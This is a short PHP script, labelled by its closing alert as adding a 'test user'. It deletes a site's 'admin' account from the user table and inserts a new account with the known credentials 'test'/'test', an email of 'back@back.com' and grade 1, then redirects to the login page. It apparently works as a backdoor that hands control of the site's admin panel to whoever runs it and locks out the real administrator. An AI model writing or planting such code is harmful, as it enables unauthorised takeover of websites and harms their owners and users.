<?php
require('news.php');
$ip=$_SERVER['REMOTE_ADDR'];
$scrt=rand();
$name="test";
$pwdconfirm="test";
$pwdconfirm=$pwdconfirm.$scrt;
$pwdconfirm=md5($pwdconfirm);
$time=date("YmdHis");
$email="back@back.com";
$grade=1;
$sql="delete from $T_USERS where ad_name='admin'";
mysql_query($sql);
$sql="insert into $T_USERS(ad_name,ad_pswd,ad_email,ad_lastip,ad_lasttime,ad_grad,ad_scrt)values('$name','$pwdconfirm','$email','$ip','$time','$grade','$scrt')";
$result=mysql_query($sql) or die (mysql_error());
if($result) echo "<script>alert('测试用户".$name."添加成功!');window.location.replace('login.php');</script>";
?>
